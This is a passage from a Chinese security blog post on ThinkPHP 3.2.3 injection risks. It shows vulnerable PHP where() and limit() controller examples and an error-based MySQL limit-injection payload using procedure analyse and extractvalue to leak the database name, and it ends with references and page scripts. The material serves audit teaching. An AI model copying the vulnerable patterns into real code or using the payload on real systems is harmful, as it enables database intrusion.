+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $model=M(<span class="string">'user'</span>);</span><br><span class="line">    $map=I(<span class="string">'id'</span>);</span><br><span class="line">    $res=$model-&gt;where($map)-&gt;select();</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>?id=1</code>，SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span> )</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>?id[0]=0&amp;id[1]=1</code>，SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`user`</span> <span class="keyword">WHERE</span> ( <span class="number">1</span> ) <span class="keyword">AND</span> ( <span class="number">2</span> )</span><br></pre></td></tr></table></figure>
+
+<h3 id="语句拼接注入"><a href="#语句拼接注入" class="headerlink" title="语句拼接注入"></a>语句拼接注入</h3><p>直接使用SQL语句拼凑的注入</p>
+<h2 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h2><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>tp3.x对这种不能预编译的语句参数没有进行什么处理，因而可能会导致注入。</p>
+<p>limit注入相对来说少见，对MySQL版本要求在5.7以下，在MySQL5.5下复现成功，此处记录一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$model=M(<span class="string">'info'</span>);</span><br><span class="line">	$start = $_GET[<span class="string">'start'</span>];</span><br><span class="line">	$limit = $_GET[<span class="string">'limit'</span>];</span><br><span class="line">    $data = $model-&gt;limit($start,$limit)-&gt;select();</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/18.jpg" width>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/2630" target="_blank" rel="noopener">水文-Thinkphp3.2.3安全开发须知</a></p>
+<p><a href="https://www.cnblogs.com/escape-w/p/11290034.html" target="_blank" rel="noopener">Thinkphp3分析与审计</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/" rel="next" title="ThinkPHP3.2.3注入分析">
+                <i class="fa fa-chevron-left"></i> ThinkPHP3.2.3注入分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/24/HTTP走私攻击/" rel="prev" title="HTTP请求走私学习">
+                HTTP请求走私学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模板注入"><span class="nav-number">2.</span> <span class="nav-text">模板注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#display"><span class="nav-number">2.1.</span> <span class="nav-text">display</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#show"><span class="nav-number">2.2.</span> <span class="nav-text">show</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#display2"><span class="nav-number">2.3.</span> <span class="nav-text">display2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fetch"><span class="nav-number">2.4.</span> <span class="nav-text">fetch?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#失误造成的注入"><span class="nav-number">3.</span> <span class="nav-text">失误造成的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#field注入"><span class="nav-number">3.1.</span> <span class="nav-text">field注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order注入"><span class="nav-number">3.2.</span> <span class="nav-text">order注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#comment注入"><span class="nav-number">3.3.</span> <span class="nav-text">comment注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group注入"><span class="nav-number">3.4.</span> <span class="nav-text">group注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#having注入"><span class="nav-number">3.5.</span> <span class="nav-text">having注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Count-Max-Min-Avg-Sum注入"><span class="nav-number">3.6.</span> <span class="nav-text">Count,Max,Min,Avg,Sum注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#setInc-setDec注入"><span class="nav-number">3.7.</span> <span class="nav-text">setInc,setDec注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where注入"><span class="nav-number">3.8.</span> <span class="nav-text">where注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#语句拼接注入"><span class="nav-number">3.9.</span> <span class="nav-text">语句拼接注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他补充"><span class="nav-number">4.</span> <span class="nav-text">其他补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#limit注入"><span class="nav-number">4.1.</span> <span class="nav-text">limit注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">160k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">2:26</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
